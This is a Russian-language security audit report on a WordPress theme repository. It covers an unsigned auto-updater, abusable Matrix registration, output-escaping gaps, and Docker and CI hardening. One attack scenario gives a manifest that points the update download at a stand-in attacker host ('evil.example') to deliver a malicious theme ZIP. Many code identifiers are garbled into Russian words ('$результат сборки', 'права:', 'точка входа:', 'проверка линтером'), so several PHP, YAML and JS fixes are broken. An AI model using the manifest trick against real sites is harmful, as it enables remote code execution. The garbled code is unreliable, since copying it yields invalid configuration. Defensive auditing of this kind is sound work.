# Полный отчёт аудита репозитория `scamII/scam-dev`

**Дата аудита:** 2026-07-07  
**Репозиторий:** `scamII/scam-dev`  
**Ветка:** `main`  
**Проверенный HEAD:** `08c903872744ce170775e952477055f68338991b`  
**Тип проекта:** гибридная тема WordPress: PHP templates/modules + React components + Tailwind CSS + Docker + GitHub Actions  
**Версия темы по `style.css`:** `1.2.37`  
**Итоговый вердикт:** `ТРЕБУЕТ_ИСПРАВЛЕНИЙ_ДО_PRODUCTION`

---

> Примечание: имена файлов, имена функций, названия пакетов, коды уязвимостей, команды, YAML/PHP/JS-фрагменты и общепринятые технические обозначения вроде XSS, CSRF, SSRF, CI/CD, REST, WPCS оставлены без перевода намеренно.

## 0. Краткий вывод

Репозиторий стал заметно лучше, чем обычная самописная WordPress-тема: есть модульная структура `inc/`, Tailwind/React, Docker, GitHub Actions, WPCS-конфиг, nonce/capability-проверки в части admin-функций и в целом нормальное понимание базовой WordPress-безопасности.

Но текущий проект **нельзя считать готовым к production без исправлений**. Основные проблемы не в одном конкретном XSS или SQL injection, а в сочетании нескольких системных рисков:

1. **Кастомный автообновлятор темы ставит обновления с собственного URL без подписи/хэша и принудительно включает автообновление.** Это риск цепочки поставки уровня `ВЫСОКИЙ`.
2. **Публичная Matrix-регистрация проксирует создание пользователей через Matrix admin token и фактически допускает массовую регистрацию валидных аккаунтов.** Это риск злоупотребления / DoS / спама уровня `ВЫСОКИЙ`.
3. **Сборка Frontend устроена неправильно: `webpack.config.js` использует уже собранный/minified `assets/js/app.js` как исходная точка входа, а JSX-компоненты лежат рядом, но не являются настоящим источником сборки.** Это архитектурный дефект уровня `ВЫСОКИЙ` по поддерживаемости.
4. **В нескольких местах есть непоследовательный escaping вывода WordPress-данных:** breadcrumb, nav walker, заголовки, даты в атрибутах, меню. Это не доказанный unauth RCE, но это реальная зона хранимой/отражённой XSS риска при расширении ролей/контента.
5. **Зависимости разработкиOps-профиль небезопасен при переносе за пределы локальной машины:** жёстко заданные DB credentials, `WORDPRESS_DEBUG=true`, открытые MySQL/phpMyAdmin порты, широкие GitHub Actions права.
6. **Бизнес-логика живёт внутри темы:** Matrix registration, VK import, theme updater, SEO/schema, widgets. Для WordPress это допустимо на ранней стадии, но архитектурно лучше вынести это в plugin/сервисный слой.

---

## 1. Итоговые оценки

| Область | Оценка | Комментарий |
|---|---:|---|
| Безопасность | **5.5 / 10** | Базовые nonce/capability/escaping частично есть, но цепочка поставки updater, Matrix abuse и непоследовательный escaping требуют исправлений. |
| Архитектура | **6.0 / 10** | Модульность есть, но тема содержит бизнес-логику и Frontend исходники/результаты сборки перепутаны. |
| Качество кода | **6.2 / 10** | Код в целом читаемый, но много inline HTML/JS, строковой сборки HTML, отсутствуют тесты и есть мёртвые/дублирующие участки. |
| Зависимости разработкиOps / CI/CD | **5.0 / 10** | Сборка есть, но нет security/проверка линтером/test gate, права широкие, Docker dev-профиль опасен при переиспользовании. |
| Поддерживаемость | **5.8 / 10** | Поддерживать можно, но при росте проект начнёт быстро ломаться из-за смешения theme/plugin/application layers. |
| Готовность к production | **4.8 / 10** | Для личного dev-сайта приемлемо после базовой настройки; для публичного production нужны исправления из roadmap. |

---

## 2. Область проверки

Статически проверены:

### Корневые файлы и шаблоны
- `functions.php`
- `header.php`
- `footer.php`
- `front-page.php`
- `index.php`
- `single.php`
- `page.php`
- `archive.php`
- `search.php`
- `404.php`
- `page-category-posts.php`
- `page-matrix-register.php`
- `style.css`

### PHP-модули
- `inc/setup.php`
- `inc/enqueue.php`
- `inc/customizer.php`
- `inc/nav-walker.php`
- `inc/admin-vk-import.php`
- `inc/class-vk-import.php`
- `inc/class-theme-updater.php`
- `inc/matrix-register.php`
- `inc/widget-matrix-stats.php`
- `inc/widget-donate.php`
- `inc/svg.php`
- `inc/highlightjs.php`
- `inc/breadcrumbs.php`
- `inc/schema.php`
- `inc/seo.php`
- `inc/search-bar.php`

### Части шаблонов
- `template-parts/content.php`
- `template-parts/content-search.php`
- `template-parts/content-none.php`
- `template-parts/donate-inline.php`

### Frontend / сборка
- `assets/js/app.js`
- `assets/js/main.js`
- `assets/js/components/ThemeToggle.jsx`
- `assets/js/components/BurgerMenu.jsx`
- `assets/js/components/TableOfContents.jsx`
- `assets/js/components/RelatedPosts.jsx`
- `assets/js/components/CopyCode.jsx`
- `assets/js/components/ProgressBar.jsx`
- `assets/js/components/BackToTop.jsx`
- `assets/scss/style.css`
- `assets/scss/theme-vars.css`
- `webpack.config.js`
- `postcss.config.js`
- `package.json`
- `package-lock.json` — верхний зависимость section

### Зависимости разработкиOps/docs
- `docker-compose.yml`
- `Makefile`
- `.dockerignore`
- `.gitignore`
- `.esпроверка линтеромrc.json`
- `composer.json`
- `phpcs.xml.dist`
- `.github/workflows/сборка.yaml`
- `SECURITY.md`
- `README.md`

**Ограничение аудита:** это глубокий статический аудит исходников и конфигурации. Зависимости выполнения-тесты, `npm audit`, `composer audit`, `phpcs`, `phpstan`, DAST и exploit-проверка на живом стенде не выполнялись. Это нужно добавить отдельным шагом перед реальным production.

---

# 3. Найденные проблемы по безопасности

## ВЫСОКИЙ-001 — Небезопасный кастомный автообновлятор темы без подписи/хэша

**Файлы:**
- `inc/class-theme-updater.php`
- `Makefile`

**Участки:**
- `inc/class-theme-updater.php:15` — манифест обновления URL: `https://scam-dev.ru/theme-update.json`
- `inc/class-theme-updater.php:26-48` — получение JSON и установка `package` из `download_url`
- `inc/class-theme-updater.php:57-61` — принудительное `auto_update` для этой темы
- `Makefile:56-58` — деплой ZIP и генерация `theme-update.json`

**Проблема:**

Тема реализует собственный update mechanism. Она получает `theme-update.json`, берёт из него `download_url` и передаёт WordPress ссылку на ZIP-пакет обновления. При этом:

- нет криптографической подписи манифеста;
- нет SHA-256/SHA-512 хэша ZIP;
- нет проверки, что `download_url` принадлежит строго ожидаемому домену;
- нет pinning публичного ключа;
- нет ручного подтверждения обновления;
- `auto_update()` возвращает `true` для темы всегда.

**Риск:**

Если будет скомпрометирован домен `scam-dev.ru`, DNS, webroot, CI/CD-деплой, сервер с `/var/www/html/theme-update.json`, либо TLS/hosting account, злоумышленник сможет выдать новый `theme-update.json` с malicious ZIP. WordPress скачает и установит тему как обновление. В WordPress тема — это PHP-код, то есть итоговый риск — **удалённое выполнение кода на сайте** через цепочка поставки.

**Сценарий атаки:**

1. Атакующий получает доступ к серверу/домену обновлений.
2. Подменяет `theme-update.json`:
   ```json
   {
     "version": "99.0.0",
     "download_url": "https://evil.example/malicious-theme.zip"
   }
   ```
3. Тема видит новую версию и отдаёт WordPress update package.
4. Так как `auto_update()` возвращает `true`, обновление может поставиться автоматически.
5. Malicious PHP попадает в WordPress и выполняется.

**Критичность:** `ВЫСОКИЙ`

**Почему не КРИТИЧЕСКИЙ:** атака требует компрометации update-channel или домена/сервера обновлений. Но при таком событии impact максимальный.

**Как исправить:**

Минимально:
- отключить принудительный автообновление:
  ```php
  public function auto_update( $update, $item ) {
      return $update;
  }
  ```
- разрешить `download_url` только с ожидаемого домена:
  ```php
  $host = wp_parse_url( $download_url, PHP_URL_HOST );
  if ( 'scam-dev.ru' !== $host ) {
      return $transient;
  }
  ```
- добавить SHA-256 в manifest:
  ```json
  {
    "version": "1.2.38",
    "download_url": "https://scam-dev.ru/scam-dev-1.2.38.zip",
    "sha256": "..."
  }
  ```
- после скачивания пакета проверять hash до установки.

Правильно:
- подписывать manifest приватным ключом;
- хранить публичный ключ в теме;
- проверять detached signature через libsodium:
  ```php
  sodium_crypto_sign_verify_detached( $signature, $payload, $public_key );
  ```
- либо использовать GitHub Releases + checksums + ручное обновление.

---

## ВЫСОКИЙ-002 — Публичная Matrix-регистрация позволяет массово создавать валидные аккаунты

**Файлы:**
- `inc/matrix-register.php`
- `page-matrix-register.php`

**Участки:**
- `page-matrix-register.php:84-188` — публичная форма регистрации
- `inc/matrix-register.php:151-220` — обработчик формы
- `inc/matrix-register.php:160-169` — ограничение частоты запросов только на часть неуспешных попыток
- `inc/matrix-register.php:207-220` — успешная регистрация сбрасывает ограничение частоты запросов
- `inc/matrix-register.php:229-358` — создание Matrix-пользователя через Synapse Admin API

**Проблема:**

Публичный посетитель сайта может отправить форму и через WordPress создать пользователя на Matrix-сервере. Серверная логика проверяет nonce и валидирует username/password, но:

- нет CAPTCHA;
- нет email verification;
- нет invite code;
- нет approve-by-admin режима;
- нет глобального лимита регистраций;
- нет лимита успешных регистраций;
- при успешной регистрации `delete_transient( $rate_key )` сбрасывает счётчик;
- ограничение частоты запросов увеличивается только при ошибках валидации/API.

Итог: бот может генерировать валидные username/password и создавать аккаунты пачками, не попадая в лимит ошибок.

**Риск:**

- массовая регистрация Matrix-аккаунтов;
- спам внутри Matrix;
- нагрузка на Synapse;
- расход ресурсов;
- репутационные проблемы домена/сервера;
- потенциальный abuse federation, если сервер федеративный;
- последующий ручной cleanup пользователей.

**Сценарий атаки:**

1. Бот открывает страницу регистрации.
2. Получает nonce.
3. Отправляет валидные данные:
   - `mx_username=user12345`
   - `mx_password=LongRandomPassword123`
   - `mx_tos=1`
4. Аккаунт создаётся.
5. Rate key удаляется.
6. Бот повторяет процесс.

**Критичность:** `ВЫСОКИЙ`

**Как исправить:**

Минимально:
- считать **все** попытки, включая успешные;
- ввести лимит успешных регистраций по IP / subnet / username prefix;
- добавить server-side max length:
  ```php
  if ( strlen( $username ) > 64 ) {
      $form_errors[] = 'Имя пользователя слишком длинное.';
  }

  if ( strlen( $password ) > 128 ) {
      $form_errors[] = 'Пароль слишком длинный.';
  }
  ```
- не сбрасывать rate key при успешной регистрации;
- логировать успешные регистрации.

Лучше:
- invite-only registration;
- email verification;
- CAPTCHA/hCaptcha/Turnstile;
- admin approval;
- белый список доменов/email;
- отдельный plugin для Matrix provisioning;
- audit log:
  - IP
  - username
  - user-agent
  - timestamp
  - result
  - Matrix response code.

Пример более безопасной политики:

```php
// 5 submit attempts per 15 minutes, regardless of success/error.
$attempts = (int) get_transient( $rate_key );
if ( $attempts >= 5 ) {
    return self::fail( 'Слишком много попыток.' );
}
set_transient( $rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS );

// Additional success limit.
$success_key = 'matrix_reg_success_' . md5( $ip );
$successes = (int) get_transient( $success_key );
if ( $successes >= 2 ) {
    return self::fail( 'Лимит регистраций исчерпан.' );
}
```

---

## СРЕДНИЙ-001 — Matrix form state хранится в глобальных transients и может смешиваться между пользователями

**Файлы:**
- `inc/matrix-register.php`
- `page-matrix-register.php`

**Участки:**
- `inc/matrix-register.php:198-214` — `matrix_register_errors`, `matrix_register_username`
- `inc/matrix-register.php:217-220` — `matrix_register_success`
- `page-matrix-register.php:14-20` — чтение и удаление этих transients

**Проблема:**

Ошибки, success-state и старый username сохраняются в transients с глобальными ключами:

```php
matrix_register_errors
matrix_register_success
matrix_register_username
```

Они не привязаны к:
- IP;
- cookie/session id;
- nonce;
- browser fingerprint;
- user id.

Любой следующий посетитель страницы может забрать состояние, созданное предыдущим submit, потому что страница читает и сразу удаляет global transient.

**Риск:**

- пользователь A отправил username;
- пользователь B открыл страницу и увидел username/error/success пользователя A;
- race conditions;
- ложное сообщение об успешной регистрации;
- утечка username;
- очень плохая UX-предсказуемость.

**Критичность:** `СРЕДНИЙ`

**Как исправить:**

Использовать per-visitor key:

```php
$session_id = $_COOKIE['matrix_form_sid'] ?? wp_generate_uuid4();
setcookie( 'matrix_form_sid', $session_id, time() + 600, COOKIEPATH, COOKIE_DOMAIN, is_ssl(), true );

$key = 'matrix_register_errors_' . hash_hmac( 'sha256', $session_id, AUTH_SALT );
set_transient( $key, $form_errors, 60 );
```

Или передавать состояние через redirect query param + server-side nonce-bound storage.

---

## СРЕДНИЙ-002 — Matrix Admin API token используется внутри темы и вызывается при Frontend-сценариях

**Файлы:**
- `inc/matrix-register.php`
- `inc/widget-matrix-stats.php`

**Участки:**
- `inc/matrix-register.php:229-358` — bearer token для создания пользователей
- `inc/widget-matrix-stats.php:21-24` — получение token и запрос статистики
- `inc/widget-matrix-stats.php:56-71` — прямые запросы к Matrix Admin API

**Проблема:**

Тема напрямую знает `MATRIX_ADMIN_TOKEN` и делает запросы в Matrix Admin API. Токен не выводится клиенту, но архитектурно это опасно:

- тема становится privileged интеграционный слой;
- Frontend-widget вызывает admin API на обычных просмотрах страниц;
- нет кеширования;
- нет circuit breaker;
- нет белый список/HTTPS validation для `MATRIX_HOMESERVER_URL`;
- нет централизованной обработки ошибок.

**Риск:**

- лишняя нагрузка на Matrix на каждом рендере виджета;
- возможные таймауты Frontend-страниц;
- расширение attack surface WordPress-темы;
- повышенный ущерб при компрометации темы.

**Критичность:** `СРЕДНИЙ`

**Как исправить:**

- вынести Matrix integration в отдельный plugin;
- токен хранить вне темы;
- добавить service class;
- кешировать stats:
  ```php
  $cached = get_transient( 'matrix_stats' );
  if ( false !== $cached ) {
      return $cached;
  }
  ```
- валидировать `MATRIX_HOMESERVER_URL`:
  - только `https`;
  - только ожидаемый host;
  - запрет private/local addresses;
- добавить таймауты и логирование.

---

## СРЕДНИЙ-003 — Stored XSS риск в кастомном nav walker из-за неэкранированного menu title

**Файл:** `inc/nav-walker.php`

**Участки:**
- `inc/nav-walker.php:49-52`

**Проблема:**

Кастомный walker берёт title:

```php
$title = apply_filters( 'the_title', $data_object->title, $data_object->ID );
...
$результат сборки .= '<a' . $attributes . '>' . $title . '</a>';
```

`$title` выводится без `esc_html()` / `wp_kses_post()`.

**Риск:**

Если пользователь с правом редактировать меню создаст menu item title с HTML/JS payload, этот payload будет выведен в навигации. Обычно меню редактируют администраторы, но в реальных WordPress-проектах capability model часто расширяют. При компрометации админки это тоже ускоряет persistent XSS.

**Критичность:** `СРЕДНИЙ`

**Как исправить:**

```php
$title_text = apply_filters( 'the_title', $data_object->title, $data_object->ID );
$title      = esc_html( $title_text );

if ( $has_kids ) {
    $title .= ' ' . $safe_svg;
}

$результат сборки .= '<a' . $attributes . '>' . $title . '</a>';
```

SVG держать как заранее заданную константу/строку, не смешивать с пользовательским title.

---

## СРЕДНИЙ-004 — Непоследовательный escaping WordPress-данных в templates/breadcrumbs

**Файлы:**
- `inc/breadcrumbs.php`
- `single.php`
- `page.php`
- `index.php`
- `front-page.php`
- `footer.php`
- `page-category-posts.php`
- `template-parts/content.php`
- `template-parts/content-search.php`

**Примеры:**
- `inc/breadcrumbs.php:23` — `get_the_title()` выводится без escaping
- `inc/breadcrumbs.php:26` — `get_the_title()` для page без escaping
- `inc/breadcrumbs.php:29` — `single_term_title()` без escaping
- `single.php:27` — `the_title()` в h1
- `single.php:33` — `the_author()`
- `single.php:36-38` — date результат сборки в атрибутах/тексте без `esc_attr/esc_html`
- `single.php:163` — `the_title()` в related block
- `page.php:16` — `the_title()`
- `footer.php:10`, `footer.php:113` — `bloginfo('name')`
- `index.php:60`, `single.php:36`, `page-category-posts.php:69` — даты в `datetime` без `esc_attr`
- `template-parts/content.php:13/17` — `the_title()`

**Проблема:**

Многие WordPress template tags часто используются напрямую, но в строгом security-review лучше всегда выводить через экранирование с учётом контекста:

- HTML text: `esc_html()`
- attribute: `esc_attr()`
- URL: `esc_url()`
- known safe HTML: `wp_kses_post()`

Сейчас в проекте часть мест сделана правильно (`esc_html`, `esc_url`), а часть — нет. Это создаёт риск XSS при будущих изменениях ролей, импортов, кастомных post types, menu fields или отключении стандартных WordPress-фильтров.

**Риск:**

- хранимой XSS через title/term/user display fields;
- похожей на отражённую XSS через search/breadcrumb formatting при неправильном использовании `get_search_query()`;
- появление уязвимости при подключении пользовательского контента из внешних источников.

**Критичность:** `СРЕДНИЙ`

**Как исправить:**

Примеры:

```php
echo esc_html( get_the_title() );
echo esc_html( get_the_author() );
echo esc_attr( get_the_date( 'c' ) );
echo esc_html( get_the_date() );
echo esc_html( single_term_title( '', false ) );
echo esc_html( get_bloginfo( 'name' ) );
```

Для `the_permalink()` лучше использовать:

```php
echo esc_url( get_permalink() );
```

---

## СРЕДНИЙ-005 — VK import скачивает внешние media без достаточных ограничений размера/MIME/host

**Файл:** `inc/class-vk-import.php`

**Участки:**
- `inc/class-vk-import.php:16-29` — запрос к VK API
- `inc/class-vk-import.php:118-125` — импорт фото по URL
- `inc/class-vk-import.php:198-226` — `download_url()` + `media_handle_sideload()`

**Проблема:**

Код валидирует URL через `wp_http_validate_url()`, но для production hardening этого мало:

- нет белый список CDN/имена хостов;
- нет лимита Content-Length;
- нет проверки MIME до sideload;
- нет ограничения общего количества attachment download на один запуск;
- нет фоновой очереди;
- нет retry/backoff;
- token передаётся в query string.

**Риск:**

- перегрузка диска/трафика при больших media;
- импорт неожиданного типа файла;
- зависания админки;
- leakage access token в логах HTTP-прокси/серверов;
- SSRF-класс риска при будущем изменении источника URL.

**Критичность:** `СРЕДНИЙ`

**Что уже хорошо:**

- import доступен только `manage_options`;
- есть nonce в admin form;
- text content экранируется через `esc_html`;
- image URL проходит `wp_http_validate_url`;
- filename sanitization есть.

**Как исправить:**

- использовать `wp_safe_remote_get`;
- проверять host белый список;
- проверять `Content-Type`;
- проверять размер:
  ```php
  $content_length = wp_remote_retrieve_header( $response, 'content-length' );
  if ( $content_length > 5 * MB_IN_BYTES ) { reject; }
  ```
- ограничить attachments per run;
- запускать импорт через Action Scheduler / WP Cron queue;
- хранить import logs.

---

## СРЕДНИЙ-006 — SVG upload sanitizer разрешает `style`/`<style>` и выглядит недостаточно строгим

**Файл:** `inc/svg.php`

**Участки:**
- `inc/svg.php:9-18` — разрешение SVG для пользователей с `upload_files` + `unfiltered_html`
- `inc/svg.php:67-210` — custom SVG sanitizer
- `inc/svg.php:95`, `106`, `118`, `134`, `145`, `156`, `167`, `176` — разрешение `style` attributes
- `inc/svg.php:98` — разрешение `<style>`

**Проблема:**

SVG — сложный и опасный формат. Кастомный sanitizer через `wp_kses()` лучше, чем отсутствие фильтрации, но разрешение `style` и `<style>` делает политику широкой. В SVG/CSS исторически часто встречаются обходы через внешние URL, CSS constructs, нестандартное поведение браузеров.

Сейчас upload разрешён фактически администраторам (`unfiltered_html`), поэтому риск ограничен. Но если capability model изменится, это станет более опасно.

**Критичность:** `СРЕДНИЙ`

**Как исправить:**

- использовать проверенную библиотеку типа `enshrined/svg-sanitize`;
- убрать `<style>` и `style` attributes из allowed list;
- запретить любые external URL references;
- после очистки проверять XML structure;
- ограничить размер SVG;
- явно проверять MIME через `finfo_file`.

---

## СРЕДНИЙ-007 — Docker dev-конфигурация опасна при переносе на staging/production

**Файл:** `docker-compose.yml`

**Участки:**
- `docker-compose.yml:10-13` — жёстко заданные DB credentials
- `docker-compose.yml:16-17` — MySQL exposed на host
- `docker-compose.yml:24` — `wordpress:latest`
- `docker-compose.yml:33-34` — `WORDPRESS_DEBUG=true`
- `docker-compose.yml:43-57` — phpMyAdmin exposed, root credentials

**Проблема:**

Зависимости разработки-compose содержит:

```yaml
MYSQL_ROOT_PASSWORD: root
MYSQL_USER: wordpress
MYSQL_PASSWORD: wordpress
WORDPRESS_DEBUG: "true"
ports:
  - "3306:3306"
  - "8081:80"
```

Для локального dev это удобно. Для любого публичного стенда — опасно.

**Риск:**

- открытая MySQL;
- открытый phpMyAdmin;
- predictable credentials;
- debug disclosures;
- unexpected update из-за `wordpress:latest`.

**Критичность:** `СРЕДНИЙ` для локального dev, `ВЫСОКИЙ`, если этот compose используют вне localhost.

**Как исправить:**

- вынести секреты в `.env`;
- использовать `.env.example`;
- bind только на localhost:
  ```yaml
  ports:
    - "127.0.0.1:3306:3306"
  ```
- phpMyAdmin вынести в отдельный profile:
  ```yaml
  profiles: ["debug"]
  ```
- заменить `wordpress:latest` на pinned version;
- `WORDPRESS_DEBUG=false` по умолчанию.

---

## СРЕДНИЙ-008 — GitHub Actions права шире, чем нужно

**Файл:** `.github/workflows/сборка.yaml`

**Участки:**
- `.github/workflows/сборка.yaml:15-16` — `права: contents: write`
- `.github/workflows/сборка.yaml:7-13` — workflow запускается на push и pull_request
- `.github/workflows/сборка.yaml:78-85` — release creation

**Проблема:**

Workflow на весь job/workflow получает `contents: write`. Для обычного сборка на PR достаточно `contents: read`. Write нужен только release job/step при tag push.

**Риск:**

- при цепочка поставки атаке на зависимость/action потенциальный ущерб выше;
- принцип минимально необходимые права нарушен;
- PR/сборка job получает лишнюю permission-среду.

**Критичность:** `СРЕДНИЙ`

**Как исправить:**

Разнести сборка и release права:

```yaml
права:
  contents: read

jobs:
  сборка:
    права:
      contents: read

  release:
    if: startsWith(github.ref, 'refs/tags/v')
    права:
      contents: write
```

Также:
- pin GitHub Actions по SHA, не только `@v4` / `@v2`;
- добавить `npm audit`, `composer audit`, `phpcs`, `npm run проверка линтером:js`, `npm run проверка линтером:css`.

---

## СРЕДНИЙ-009 — Нет security/проверка линтером/test gate в CI

**Файлы:**
- `.github/workflows/сборка.yaml`
- `composer.json`
- `phpcs.xml.dist`
- `package.json`

**Проблема:**

В репозитории есть:
- `composer.json` со WPCS;
- `phpcs.xml.dist`;
- npm scripts `проверка линтером:css`, `проверка линтером:js`, `format`.

Но CI выполняет только:

```bash
npm ci --legacy-peer-deps
npm run сборка
```

Не выполняются:
- PHP coding standards;
- JS проверка линтером;
- CSS проверка линтером;
- зависимость audit;
- static analysis;
- package integrity/security scan.

**Риск:**

Ошибки escaping, WordPress standards, syntax regressions и зависимость issues не блокируют релиз.

**Критичность:** `СРЕДНИЙ`

**Как исправить:**

Добавить в CI:

```yaml
- run: npm ci
- run: npm run проверка линтером:js
- run: npm run проверка линтером:css
- run: npm run сборка
- run: composer install --no-interaction --prefer-dist
- run: composer проверка линтером
- run: npm audit --audit-level=moderate
```

Для WordPress/PHP:
- `php -l` по всем PHP;
- PHPCS/WPCS;
- PHPCompatibilityWP;
- Psalm/PHPStan по возможности.

---

## СРЕДНИЙ-010 — Публичное раскрытие server uptime на главной

**Файл:** `front-page.php`

**Участки:**
- `front-page.php:153-178`

**Проблема:**

Главная страница читает `/proc/uptime` и показывает uptime сервера публично.

**Риск:**

Uptime сам по себе не является секретом, но это operational disclosure:

- помогает понять, как давно сервер перезапускался;
- косвенно показывает patch cadence;
- даёт fingerprint инфраструктуры;
- может раскрыть, что сайт работает на Linux-like окружении с `/proc`.

**Критичность:** `НИЗКИЙ` / `СРЕДНИЙ` в зависимости от модели угроз.

**Как исправить:**

- убрать публичный uptime;
- заменить на декоративный статичный текст;
- если нужен статус — показывать только generic `ONLINE`;
- реальный uptime оставить в админке/мониторинге.

---

## НИЗКИЙ-001 — Несколько `inc/*` файлов не имеют direct access guard

**Файлы:**
- `inc/admin-vk-import.php`
- `inc/class-vk-import.php`
- `inc/class-theme-updater.php`
- `inc/breadcrumbs.php`
- `inc/schema.php`
- `inc/seo.php`

**Проблема:**

Часть файлов не начинает с:

```php
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}
```

**Риск:**

Обычно прямой вызов этих файлов приведёт к fatal error из-за отсутствия WordPress functions, поэтому impact низкий. Но это всё равно WordPress best practice и снижает шум/утечки.

**Критичность:** `НИЗКИЙ`

**Как исправить:**

Добавить guard во все PHP-модули.

---

## НИЗКИЙ-002 — Inline JS/event handlers мешают CSP и ухудшают security posture

**Файлы:**
- `header.php`
- `footer.php`
- `front-page.php`
- `page-matrix-register.php`
- `template-parts/donate-inline.php`
- `inc/search-bar.php`
- `inc/matrix-register.php` menu HTML

**Примеры:**
- `header.php:9-18` — inline theme script
- `header.php:57-63` — inline event handlers для поиска
- `footer.php:117-120` — inline event handlers
- `page-matrix-register.php:131-134` — inline password toggle
- `template-parts/donate-inline.php:29-30` — inline hover handlers

**Проблема:**

Inline JS делает невозможным строгий CSP без `'unsafe-inline'`.

**Риск:**

Если позже появится XSS, строгий CSP не сможет эффективно смягчить последствия.

**Критичность:** `НИЗКИЙ`, но важно перед production.

**Как исправить:**

- перенести JS в React/components или отдельный enqueued JS;
- убрать inline handlers;
- использовать CSS hover вместо JS hover;
- добавить CSP-ready архитектуру.

---

## НИЗКИЙ-003 — External QR service создаёт privacy зависимость

**Файл:** `inc/widget-donate.php`

**Участок:**
- `inc/widget-donate.php:36`

**Проблема:**

QR-картинка генерируется через внешний сервис:

```php
https://api.qrserver.com/v1/create-qr-code/
```

**Риск:**

Посетители сайта при загрузке виджета обращаются к third-party сервису, раскрывая IP/user-agent/referrer.

**Критичность:** `НИЗКИЙ`

**Как исправить:**

- сгенерировать QR локально и положить в assets/media;
- либо проксировать/кешировать картинку локально;
- добавить `referrerpolicy="no-referrer"`.

---

## НИЗКИЙ-004 — `filemtime()` без проверки существования файла

**Файлы:**
- `inc/enqueue.php`
- `inc/highlightjs.php`

**Участки:**
- `inc/enqueue.php:10-11`
- `inc/highlightjs.php:10`, `18`, `26`

**Проблема:**

Если артефакты сборки отсутствуют, `filemtime()` выдаст warning.

**Риск:**

- warnings в debug;
- потенциальный broken Frontend;
- шум в логах.

**Критичность:** `НИЗКИЙ`

**Как исправить:**

```php
$path = get_template_directory() . '/assets/js/app.js';
$ver  = file_exists( $path ) ? filemtime( $path ) : SCAM_DEV_VERSION;
```

---

## НИЗКИЙ-005 — Generic function name `reading_time()`

**Файл:** `functions.php`

**Участок:**
- `functions.php:41-46`

**Проблема:**

Функция называется `reading_time()`, без project prefix.

**Риск:**

Конфликт с plugin/theme function name.

**Критичность:** `НИЗКИЙ`

**Как исправить:**

Переименовать в:

```php
scam_dev_reading_time()
```

---

# 4. Архитектурный аудит

## 4.1. Главная архитектурная проблема: тема стала application/слой плагина

Сейчас тема отвечает не только за presentation:

- Matrix user registration;
- Matrix admin stats;
- VK import;
- custom theme updater;
- SVG upload policy;
- SEO/schema;
- donation widgets;
- content filtering/excluding categories.

Для WordPress это типичный путь роста темы, но архитектурно это риск. Тема должна отвечать в первую очередь за отображение. Интеграции с внешними системами и админские действия лучше выносить в plugin/сервисный слой.

**Почему это важно:**

Если пользователь сменит тему:
- Matrix registration исчезнет;
- VK import исчезнет;
- updater исчезнет;
- widgets исчезнут;
- часть данных/страниц останется в БД, но логика обработки пропадёт.

**Рекомендация:**

Разделить:

```text
scam-dev-theme/
  templates
  assets
  visual components
  theme setup

scam-dev-core-plugin/
  Matrix registration
  VK import
  theme/plugin updater
  security policies
  custom post/meta logic
  REST endpoints
  admin pages
```

---

## 4.2. Frontend исходники/результаты сборки перепутаны

**Файлы:**
- `webpack.config.js`
- `assets/js/app.js`
- `assets/js/components/*.jsx`
- `.github/workflows/сборка.yaml`
- `Makefile`

**Участки:**
- `webpack.config.js:8-11`
- `assets/js/app.js` — уже minified bundle
- `.github/workflows/сборка.yaml:51-56`
- `Makefile:36-40`

**Проблема:**

`webpack.config.js` указывает исходная точка входа:

```js
точка входа: {
  app: path.resolve( __dirname, 'assets/js/app.js' ),
}
```

Но `assets/js/app.js` в репозитории — уже minified bundle. При этом рядом лежат исходные React-компоненты `assets/js/components/*.jsx`, но `webpack.config.js` не указывает JSX точка входа, который импортирует эти компоненты.

CI/Makefile во время package делает:

```bash
rm -rf assets/js/main.js assets/js/app.js assets/js/components
mv сборка/app.js assets/js/
```

То есть:
- исходник и артефакт лежат в одном path;
- исходник components удаляются из релизного ZIP;
- сборка может собирать уже собранный bundle;
- изменения в JSX components могут не попасть в `сборка/app.js`.

**Риск:**

- разработчик правит `ThemeToggle.jsx`, но production bundle не меняется;
- исходный код и код выполнения расходятся;
- debugging становится почти невозможным;
- reviewers смотрят не тот код;
- CI не ловит, что компоненты мёртвыми/оторванными от сборки.

**Критичность по архитектуре:** `ВЫСОКИЙ`

**Как исправить:**

Новая структура:

```text
assets/js/src/index.jsx
assets/js/src/components/ThemeToggle.jsx
assets/js/src/components/BurgerMenu.jsx
...
assets/js/dist/app.js     # generated, not исходник
сборка/app.js              # generated by wp-scripts
```

`webpack.config.js`:

```js
точка входа: {
  app: path.resolve( __dirname, 'assets/js/src/index.jsx' ),
  style: path.resolve( __dirname, 'assets/scss/style.css' ),
  editor: path.resolve( __dirname, 'assets/scss/editor.css' ),
}
```

В git:
- хранить исходник;
- generated bundle либо не хранить, либо хранить только в релизный артефакт;
- не использовать generated file как исходная точка входа.

---

## 4.3. HTML собирается строками в PHP

Примеры:
- `functions.php:47-97`
- `inc/nav-walker.php`
- `inc/matrix-register.php:122-145`
- widgets

**Проблема:**

Большие HTML-строки сложнее проверять на escaping. Риск XSS чаще возникает именно там, где HTML конкатенируется вручную.

**Рекомендация:**

Для сложных фрагментов:
- использовать template parts;
- либо PHP результат сборки mode с `?>`;
- либо helper-функции с явными escaped values;
- для menus — корректно расширять Walker и escaping.

---

## 4.4. Нет слоя сервисов

`Scam_Зависимости разработки_Matrix_Register` уже ближе к service class, но:
- HTTP logic;
- validation;
- transient storage;
- redirects;
- rendering state;
- API integration

находятся в одном классе.

**Рекомендация:**

Разделить:

```text
Matrix_Config
Matrix_RateLimiter
Matrix_Admin_Client
Matrix_Registration_Service
Matrix_Form_State
Matrix_Registration_Controller
```

Даже если это будет один plugin, разделение упростит тестирование и аудит.

---

# 5. Качество кода Review

## Что сделано хорошо

1. Во многих местах используются `esc_html`, `esc_url`, `esc_attr`.
2. VK import admin page защищён `manage_options` и nonce.
3. Matrix registration использует nonce.
4. Customizer setting имеет `sanitize_callback`.
5. JSON-LD выводится через `wp_json_encode`.
6. SVG upload ограничен пользователями с `unfiltered_html`.
7. Есть `phpcs.xml.dist` и Composer dev зависимости для WPCS.
8. Есть `.gitignore`, `.dockerignore`, `SECURITY.md`, templates для issues/PR.
9. Docker dev окружение быстро поднимает WordPress.
10. Release packaging исключает dev files из ZIP.

## Что сделано плохо/нестабильно

1. Смешаны исходник и артефакты сборки.
2. Нет автоматического CI-gate для PHPCS/проверка линтером/security.
3. В шаблонах inconsistent escaping.
4. Нет тестов.
5. Нет зависимость security automation.
6. Нет централизованного логирование/журнал аудита.
